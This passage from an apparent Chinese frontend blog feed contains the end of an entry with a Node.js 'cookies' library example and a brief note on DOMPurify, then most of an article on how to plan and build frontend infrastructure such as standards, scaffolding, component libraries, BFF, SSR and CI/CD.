class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Cookies</span> = <span class="built_in">require</span>(<span class="string">&#x27;cookies&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optionally define keys to sign cookie values</span></span><br><span class="line"><span class="comment">// to prevent client tampering</span></span><br><span class="line"><span class="keyword">var</span> keys = [<span class="string">&#x27;keyboard cat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// Create a cookies object</span></span><br><span class="line">  <span class="keyword">var</span> cookies = <span class="keyword">new</span> <span class="title class_">Cookies</span>(req, res, &#123; <span class="attr">keys</span>: keys &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a cookie</span></span><br><span class="line">  <span class="keyword">var</span> lastVisit = cookies.<span class="title function_">get</span>(<span class="string">&#x27;LastVisit&#x27;</span>, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the cookie to a value</span></span><br><span class="line">  cookies.<span class="title function_">set</span>(<span class="string">&#x27;LastVisit&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(), &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!lastVisit) &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Welcome, first time visitor!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Welcome back! Nothing much changed since your last visit at &#x27;</span> + lastVisit + <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Visit us at http://127.0.0.1:3000/ !&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br /><strong>GitHub：</strong><a href="https://github.com/pillarjs/cookies">https://github.com/pillarjs/cookies</a></p><p><a name="gT8Pv"></a></p><h1 id="7-安全"><a href="#7-安全" class="headerlink" title="7. 安全"></a>7. 安全</h1><p><a name="I0YJt"></a></p><h2 id="（1）DOMPurify"><a href="#（1）DOMPurify" class="headerlink" title="（1）DOMPurify"></a>（1）DOMPurify</h2><p>DOMPurify 是一个开源的基于DOM的快速XSS净化工具。输入HTML元素，然后通过DOM解析递归元素节点，进行净化，输出安全的HTML。 <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663347229048-8ff9cd22-334b-4633-9cd3-fa9f3bd07c6d.png?x-oss-process=image/resize,w_638,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663347229048-8ff9cd22-334b-4633-9cd3-fa9f3bd07c6d.png?x-oss-process=image/resize,w_638,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何去搞前端基建</title>
      <link href="/2022/11/21/frontend/infrastructure/ru-he-qu-gao-qian-duan-ji-jian/"/>
      <url>/2022/11/21/frontend/infrastructure/ru-he-qu-gao-qian-duan-ji-jian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="FN5iV"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好，我是<a href="https://link.juejin.cn/?target=https://github.com/YWzzy">yinhan</a>，话说当下，前端职位在近十年的磨砺之下，已是百花齐放万家争鸣，前端也不再是以前那个单纯的切图仔；<br />要问为什么不单纯，无异于 前端工程化、前端 devops、前端跨端、前端工具化、前端 CI&#x2F;CD、前端 BFF、微前端 这些技术的出现，然而这些日新月异的技术聚合，咱们可以称其为 前端基建；<br />其实无论您是想成为 高级前端工程师，还是一名 合格的 Leader，都离不开对 <strong>前端技术与业务的基础建设沉淀</strong>；<br />看完全文，我相信 <strong>您的收获会远不止于此</strong> ~<br><a name="mD7nC"></a></p><h1 id="一、什么是基建？"><a href="#一、什么是基建？" class="headerlink" title="一、什么是基建？"></a>一、什么是基建？</h1><p>基建 这个词无论身处哪个行业，基本都会存在；只是在最近几年的软件计算机行业中尤为流行；<br />在建筑行业：一幢大厦所需的地基，脚手架，一块砖、一片瓦、一袋水泥、一扇窗等等咱都可以称之为基础建设的一部分；<br />在汽车行业：一辆汽车所需的车架子、发动机、车轱辘、方向盘、门窗等等咱也可称之为基础建设的一部分；<br />那么在互联网软件行业呢？<br />笔者的理解是：在软件行业，站在广义的角度上来讲基建包含了：业务基建、工程基建、前端基建、后端基建 等等；（此处仅笔者个人理解，如果意见不一样，以你的为准）<br><a name="VUwSL"></a></p><h2 id="业务基建？"><a href="#业务基建？" class="headerlink" title="业务基建？"></a>业务基建？</h2><p>业务基建 是指公司某个业务团队层面所维护的 前端基建、后端基建、基本规范文档、产品规则、设计规范、研发流程、测试边界、上线标准以及业务中台 等等的建设；<br />业务基建 服务于整个业务团队<br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="vZHeV"></a></p><h2 id="工程基建？"><a href="#工程基建？" class="headerlink" title="工程基建？"></a>工程基建？</h2><p>工程基建 指的是业务团队内所有工程师的的一些 编码规范、api 规范、前后端协作、环境部署、微服务、微前端、性能、安全防御、统计监控、可视化 等等的建设；<br />工程基建 服务于整个工程团队；<br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="工程基建"><br><a name="sUoPL"></a></p><h2 id="前端基建？"><a href="#前端基建？" class="headerlink" title="前端基建？"></a>前端基建？</h2><p>前端基建 指的是业务团队内的前端工程师执行的一些基础建设，包括了 前端规范文档、前端脚手架、前端模板、前端组件库、前端工具库、前端 BFF、前端 CI&#x2F;CD 的构建部署、前端数据埋点 等等；<br />前端基建 仅服务于前端团队；<br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103292-69a329ee-2913-4281-90ea-8b19710ba834.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103292-69a329ee-2913-4281-90ea-8b19710ba834.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="RB8uY"></a></p><h2 id="后端基建？"><a href="#后端基建？" class="headerlink" title="后端基建？"></a>后端基建？</h2><p>后端基建 指的是业务团队内的后端工程师执行的一些基础建设，包括了 后端规范文档、后端模板、安全、日志、微服务、RESTful API、中间件、数据库、分布式、权限控制、服务器性能并发 等等；<br />注意：后端基建 仅服务于后端团队；<br><a name="YPeSd"></a></p><h2 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103126-d59552e2-a23e-450f-ac97-8309c2839051.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103126-d59552e2-a23e-450f-ac97-8309c2839051.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />看到这里，咱们已经明白了公司基建的一些基本分类和概括，下面我们也主要介绍下本文的主题前端基建；<br><a name="hEQFR"></a></p><h1 id="二、为什么要做前端基建？"><a href="#二、为什么要做前端基建？" class="headerlink" title="二、为什么要做前端基建？"></a>二、为什么要做前端基建？</h1><p><a name="amcFS"></a></p><h2 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h2><p><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103136-94a241c3-415a-417b-9c96-b64f6e5abf32.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103136-94a241c3-415a-417b-9c96-b64f6e5abf32.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="KX7VW"></a></p><h2 id="前端基建意义与作用"><a href="#前端基建意义与作用" class="headerlink" title="前端基建意义与作用"></a>前端基建意义与作用</h2><ul><li>业务复用；</li><li>提升研发效率；</li><li>规范研发流程；</li><li>团队技术提升；</li><li>团队的技术影响力；</li><li>开源建设；<br><a name="ZDuKL"></a></li></ul><h1 id="三、前端基建如何推动落地？"><a href="#三、前端基建如何推动落地？" class="headerlink" title="三、前端基建如何推动落地？"></a>三、前端基建如何推动落地？</h1><p><a name="TPbJ5"></a></p><h2 id="技术基建简要流程"><a href="#技术基建简要流程" class="headerlink" title="技术基建简要流程"></a>技术基建简要流程</h2><p>要说 前端基建，最主要的难点莫过于如何去推动落地，其中不乏需要前端同学的付出，还需要领导的支持等等，下面我给大家罗列一下大致的步骤（因团队而异）</p><ol><li><strong>要合适的同学（资源）</strong><ul><li>挨个与前端同学商议，或者自己钦点某位同学等等；而且要有动力，切勿急于求成、半途而废，注重系统思维，也千万不要找不稳定的同学（切记切记切记）</li></ul></li><li><strong>要解决的问题（问题）</strong><ul><li>针对现有公司前端人员架构、技术架构以及业务架构做对应的方案，这个没有固定的套路，不同公司所面临的问题也不一致；</li></ul></li><li><strong>要解决问题方案计划书（方案）</strong><ul><li>到目前，咱们已经有人（前端同学），也有具体想要做的事了，那么接下来很重要的一步就是出解决方案找领导确认了；</li><li>其实就类似你有一个很好 idea，写了一份特别详细的商业计划书（BP）去找投资人拉投资是一个道理；</li><li>不过最后能不能打动你的投资人，这就取决于你的 BP 做的是否够吸引人了；</li></ul></li><li><strong>要具体执行的步骤（执行）</strong><ul><li>天底下没有一蹴而就的事，工作也是，所以对于一个现有的技术团队，咱们最好是从渐进式出发，在对现有业务不影响的前提下去做增量式的研发；<br><a name="Jwfjz"></a></li></ul></li></ol><h2 id="技术基建四大特性（切记）"><a href="#技术基建四大特性（切记）" class="headerlink" title="技术基建四大特性（切记）"></a>技术基建四大特性（切记）</h2><ul><li>技术的健全性</li><li>基建的稳定性</li><li>研发的效率性</li><li>业务的体验性</li></ul><p>到这里，我相信大家对前端基建已有初步的了解，可能会有同学已经想跃跃欲试了，但是前端基建到底有些什么呢？咱们一起往下看。<br><a name="E6zrL"></a></p><h1 id="四、前端基建都有什么？"><a href="#四、前端基建都有什么？" class="headerlink" title="四、前端基建都有什么？"></a>四、前端基建都有什么？</h1><p>前端基建 在每个公司甚者每个业务团队都会有差异，其中有 技术栈的差异，有编码的差异，有文档注释的差异 等等；<br />为了迎合主要的前端基建市场，结合我司以及大部分公司的基建所需，下面给大家介绍一些符合大众的常用基建部分（后续会持续更新）；<br />下面所有分类只会简单介绍，详细相关文章会在《<a href="https://juejin.cn/column/7139087916306792462">前端搞基建</a>》专栏后续发表（敬请期待…）；<br><a name="McB2d"></a></p><h2 id="1-前端规范（Standard）"><a href="#1-前端规范（Standard）" class="headerlink" title="1. 前端规范（Standard）"></a>1. 前端规范（Standard）</h2><p>正所谓：前端不规范，后面看着办 ~<br />我相信规范两个词，是所有同学的噩梦，怕他不规范，又怕他太规范，这可真是难为死这个规范了；<br /><strong>假设招聘现有三个候选人，你会选择哪个呢？</strong></p><ul><li>一名 <strong>“摆烂”</strong> 的程序员，写的代码能运行就行；</li><li>一名 <strong>“合格”</strong> 的程序员，写的代码能运行且无 BUG；</li><li>一名 <strong>“优秀”</strong> 的程序员，写的代码能运行无 BUG 且可读性、可维护性、可复用性都高；</li></ul><p>答案显而易见 ~<br /><strong>前端规范的意义：</strong></p><ul><li>降低开发的成本；</li><li>保证代码的一致性；</li><li>提升团队的整体效率；</li></ul><p><strong>前端规范有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103622-9e027779-344f-40f3-b7c6-ef32bc760582.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103622-9e027779-344f-40f3-b7c6-ef32bc760582.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="KQ0yz"></a></p><h2 id="2-前端文档（Document）"><a href="#2-前端文档（Document）" class="headerlink" title="2.前端文档（Document）"></a>2.前端文档（Document）</h2><p>其实在许许多多的小型公司，文档缺失是一项必不可少的问题；无论是 业务文档，还是 技术文档，还是 其它文档等等；<br /><strong>问题点：</strong></p><ul><li>有些公司招人进来上午安环境，下午直接开始撸需求代码；</li><li>有些公司的新人来公司一个月了竟然还不知道公司组织架构与业务划分；</li><li>有些公司老对新几乎无交集，全靠新人猜，一个需求做下来竟然不知道做的什么，只知道一直很忙；</li><li>有些公司在安排员工去开发另一个项目业务，竟然无从下手，不知所措；</li><li>……</li></ul><p>所以一个合格的公司文档是必不可少的，无论是 新人自治，还是老带新，业务转岗 等等；<br /><strong>前端文档的意义：</strong></p><ul><li>对新人友好，快速上手；</li><li>快速融入团队；</li><li>快速了解业务；</li></ul><p><strong>前端文档有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103692-08d1ea0a-9cb6-42fd-b628-6c8afcc5decb.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103692-08d1ea0a-9cb6-42fd-b628-6c8afcc5decb.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="rgekp"></a></p><h2 id="3-前端项目模板管理（Templates）"><a href="#3-前端项目模板管理（Templates）" class="headerlink" title="3. 前端项目模板管理（Templates）"></a>3. 前端项目模板管理（Templates）</h2><p>前端项目模板 说直白点就是，公司前端所对应的项目模板，以便快速创建项目；<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103909-f0324e60-6e8d-42e4-bfc0-2d4f640104e7.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103909-f0324e60-6e8d-42e4-bfc0-2d4f640104e7.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端项目模板主要意义：</strong></p><ul><li>快速创建项目，提升效率；</li><li>项目技术栈统一，方便管理；</li></ul><p><strong>前端项目模板有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103939-19ed21a0-0ad9-4652-a66e-1a5a47ba12f6.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157103939-19ed21a0-0ad9-4652-a66e-1a5a47ba12f6.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Jonae"></a></p><h2 id="4-前端脚手架（CLI）"><a href="#4-前端脚手架（CLI）" class="headerlink" title="4. 前端脚手架（CLI）"></a>4. 前端脚手架（CLI）</h2><p>前端脚手架 作为衡量一个成熟前端团队的标准，我相信很多前端 er 都对他已经很了解了；<br />但是目前市面上对脚手架的应用我相信 90%以上的团队仅限用于项目的快速创建，也就是使用现成的模板通过命令行快速搭建；<br />那么我们做这个脚手架是不是已经做到了 资源最大化 呢？<br />显然是没有的，如何去做我会在后续的文章中详解，大家敬请期待…<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104008-f0a7309d-38b3-4737-8ec3-5d47561a8d7c.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104008-f0a7309d-38b3-4737-8ec3-5d47561a8d7c.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端脚手架的意义：</strong></p><ul><li>快速搭建项目；</li><li>技术栈统一；</li><li>规范代码风格；</li><li>提升研发效率；</li><li>自动化；</li></ul><p><strong>前端脚手架有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104029-0ba5548c-0c68-4d58-ab7a-31619236f947.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104029-0ba5548c-0c68-4d58-ab7a-31619236f947.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="tVBKN"></a></p><h2 id="5-前端组件库（UI-Design）"><a href="#5-前端组件库（UI-Design）" class="headerlink" title="5. 前端组件库（UI Design）"></a>5. 前端组件库（UI Design）</h2><p>前端 UI 组件库：在开源社区有数不胜数的组件库，例如 Ant Design、Element UI、Vant UI 等等（实在太多啦），如果你觉得某个组件库很适合用在你的项目，那么你将少一半的开发时间，是不是摸鱼的时间又多了一半呢？<br />但是在一些中大型的公司，他们<strong>有他们的标准，不可能去使用一些现成的组件库；</strong><br />而且现成的一些开源组件库中的样式与交互达不到公司设计师的要求，所以这时候 为了统一业务的设计规范与样式，咱们可以马不停蹄地赶紧向领导去提一提搞一个组件库试试看咯！<br /><strong>场景重现：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104069-53f50ff9-f30f-4268-a334-6c5be44c5958.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104069-53f50ff9-f30f-4268-a334-6c5be44c5958.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端组件库的意义：</strong></p><ul><li>组件复用，提升研发效率；</li></ul><p><strong>前端组件库有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104279-b0e414ba-41cd-40a2-812f-312baa3e3ae9.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104279-b0e414ba-41cd-40a2-812f-312baa3e3ae9.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="KTnoC"></a></p><h2 id="6-前端响应式设计-or-自适应设计"><a href="#6-前端响应式设计-or-自适应设计" class="headerlink" title="6. 前端响应式设计 or 自适应设计"></a>6. 前端响应式设计 or 自适应设计</h2><p>响应式设计（Responseive Design） 指的是一个网站同一页面在不同屏幕尺寸下有不同的布局；一套代码能在所有终端能够正常展示，并不是为每个终端做一个特定版本，响应式是为解决移动互联网浏览器而诞生的。<br />自适应设计（Adaptive web design） 需要开发多套界面，通过检测视口以及设备，来判断当前访问的设备是 pc 端与移动端，从而返回不同的页面。<br /><strong>前端响应式设计：</strong></p><ul><li>一套代码提升研发效率；</li><li>不同分辨率设备灵活性强；</li><li>快速适配多端；</li></ul><p><strong>前端自适应设计：</strong></p><ul><li>设计与体验较好；</li><li>性能相对好；</li></ul><p>注意：<br />一个项目到底是用<strong>响应式设计</strong>，还是<strong>自适应设计</strong>，这个取决于项目的排版和设计的出入程度;<br />所以如果公司 PC 端和 H5 端的排版设计有较大的出入还是建议使用自适应设计；反之可以考虑响应式设计；<br />切入盲目选择；<br><a name="BxqK1"></a></p><h2 id="7-前端工具库（类-Hooks-x2F-Utils）"><a href="#7-前端工具库（类-Hooks-x2F-Utils）" class="headerlink" title="7. 前端工具库（类 Hooks &#x2F; Utils）"></a>7. 前端工具库（类 Hooks &#x2F; Utils）</h2><p>开源社区有数不胜数的 前端工具库，如 Day.js、axios、loadsh 等等，只是其中功能未必是你想要的；<br />而且许多 前端工具库边界考量范围大，这样就增加库的体积，明明我想要的只是一个简单的功能，可还是引入了整个库，这样就得不偿失；<br />可能有同学要说不是有 Tree Shaking 了吗，难道有了 按需引入 有了 Tree Shaking 我们就可以为所欲为了吗<br />一些中大型企业团队为了复用某些工具方法，提升研发效率，一般都会封装一个工具库，身为一个合格的基建搬砖工，前端工具库怎么能少得了呢？<br /><strong>前端工具库的意义：</strong></p><ul><li>工具方法复用，提升研发效率；</li><li>减少代码量；</li><li>团队技术提升；</li></ul><p><strong>前端工具库有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104353-bb2fc1f6-f90d-45c8-a43b-84f7669b4a25.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104353-bb2fc1f6-f90d-45c8-a43b-84f7669b4a25.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="jMjja"></a></p><h2 id="8-前端工具自动化（Tools）"><a href="#8-前端工具自动化（Tools）" class="headerlink" title="8. 前端工具自动化（Tools）"></a>8. 前端工具自动化（Tools）</h2><p>可能会有同学疑惑，这个前端工具和上面的前端工具不是一样的吗？</p><ul><li>前端工具自动化 主要针对的代码上层的格式、规范、测试方面的自动化工具；</li><li>前端工具库 主要针对的是代码层面的方法复用工具，所以其本质上有较为明显的区别；</li></ul><p><strong>场景重现：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104390-f3548c35-c620-4714-bddd-382c922b2fa7.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104390-f3548c35-c620-4714-bddd-382c922b2fa7.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端工具自动化的意义：</strong></p><ul><li>代码质量与风格的统一；</li><li>自动化编码流程；</li><li>提升效率；</li></ul><p><strong>前端工具自动化有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104522-0bf97777-e7cb-48c0-a396-4168c51df863.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104522-0bf97777-e7cb-48c0-a396-4168c51df863.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ijHEN"></a></p><h2 id="9-接口数据聚合（BFF）"><a href="#9-接口数据聚合（BFF）" class="headerlink" title="9. 接口数据聚合（BFF）"></a>9. 接口数据聚合（BFF）</h2><p>前端 BFF（Backends For Frontends） 即服务于前端的后端，也称聚合层或者中间层；<br />主要将后端复杂的微服务，聚合成对各种不同用户端（无线&#x2F;Web&#x2F;H5&#x2F;第三方等）友好和统一的 API；<br /><strong>场景重现：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104879-08251786-380c-412c-927f-2b56044a3fc5.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104879-08251786-380c-412c-927f-2b56044a3fc5.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端 BFF 的意义：</strong></p><ul><li>聚合 API，释放后端；</li><li>解耦合各个业务；</li><li>后端微服务引入；</li><li>易维护和修改 API；</li><li>更好的安全性；</li><li>更好的前端错误处理；</li></ul><p><strong>前端 BFF 的简单架构：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104856-218c8b92-661a-4429-afb4-cc433e88e198.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104856-218c8b92-661a-4429-afb4-cc433e88e198.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="i5C8n"></a></p><h2 id="10-前端-SSR-推进"><a href="#10-前端-SSR-推进" class="headerlink" title="10. 前端 SSR 推进"></a>10. 前端 SSR 推进</h2><p>服务器端渲染（Server-Side Rendering） 是指由服务端完成页面的 HTML 结构拼接的页面处理技术，发送到浏览器，然后为其绑定状态与事件，成为完全可交互页面的过程。<br />简单理解就是 html 是由服务端写出，可以动态改变页面内容，即所谓的动态页面。早年的 <a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/php/9337">php</a>、<a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/asp/128906">asp</a> 、<a href="https://link.juejin.cn/?target=https://baike.baidu.com/item/jsp/141543">jsp</a> 这些 Server Page 都是 SSR 的。<br />由于公司主要是 C 端用户，而且 SEO 要求极高，所以在前后端分离的情况下，SSR 就必不可少了 ~<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104999-c2d07874-ea37-4813-afce-dc789679d052.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104999-c2d07874-ea37-4813-afce-dc789679d052.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端 SSR 的目的：</strong></p><ul><li>前后端分离；</li><li>首屏加载速度快；</li><li>利于 SEO；<br><a name="BfMuC"></a></li></ul><h2 id="11-前端自动化构建部署（CI-x2F-CD）"><a href="#11-前端自动化构建部署（CI-x2F-CD）" class="headerlink" title="11. 前端自动化构建部署（CI&#x2F;CD）"></a>11. 前端自动化构建部署（CI&#x2F;CD）</h2><p>前端 CI&#x2F;CD 一般是指持续集成、部署、发布的一个过程；<br />用白话文讲，就是你每次 git commit 代码后，都会自动的为你部署项目至 测试环境、预生产环境、生产环境，不用你每次手动的去打包后 cv 到多个服务器和环境；<br /><strong>前端 CI&#x2F;CD 的意义：</strong></p><ul><li>提高开发人员生产力；</li><li>自动化发布；</li><li>提高代码质量；</li><li>更快地提供更新；</li></ul><p><strong>前端 CI&#x2F;CD 有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104802-556c26a8-3069-4925-b6db-b9c778169476.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157104802-556c26a8-3069-4925-b6db-b9c778169476.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="T8JYg"></a></p><h2 id="12-全链路前端监控-x2F-数据埋点系统"><a href="#12-全链路前端监控-x2F-数据埋点系统" class="headerlink" title="12. 全链路前端监控&#x2F;数据埋点系统"></a>12. 全链路前端监控&#x2F;数据埋点系统</h2><p>在大部分 To C 的项目中，我相信产品和运营都需要 统计线上产品在用户中的行为和使用情况，因为这样可以更快的去了解用户群里的使用情况，从而升级和迭代产品，使其更加贴近用户。<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105105-05d4158c-135d-43dc-b293-fa82fe4c55a8.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105105-05d4158c-135d-43dc-b293-fa82fe4c55a8.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端监控&#x2F;数据埋点的目的是：</strong></p><ul><li>实现精准的点对点营销；</li><li>可以做相关的分类统计；</li><li>为用户画像的构建提供数据支持；</li><li>指导产品研发以及优化用户体验；</li></ul><p><strong>前端监控&#x2F;数据埋点有哪些数据？</strong></p><ul><li>行为数据：时间、地点、人物、交互、交互的内容；</li><li>质量数据：浏览器加载情况、错误异常等；</li><li>环境数据：浏览器相关的元数据以及地理、运营商等；</li><li>运营数据：PV、UV、转化率、留存率（很直观的数据）；<br><a name="Sxzk0"></a></li></ul><h2 id="13-前端可视化平台"><a href="#13-前端可视化平台" class="headerlink" title="13. 前端可视化平台"></a>13. 前端可视化平台</h2><p>前端可视化 字面意义理解就是用肉眼可见的就称呼为前端可视化；即所见即所得；<br />笔者这里的理解 前端可视化 包括了 数据可视化、图形可视化、VR 全景可视化、中后台视觉可视化 等等；<br />其中每一个都需要花费大量的人力与精力，如果你想全方面的从入门到精通，可以看看<a href="https://juejin.cn/user/712139263189303">月影大佬</a>的可视化教程。<br />目前公司在基于前端基建这块，所做的可视化主要是基于大家的工作流程以及工作效率所做的一个 工程可视化平台；<br /><strong>场景一：</strong><br /><img 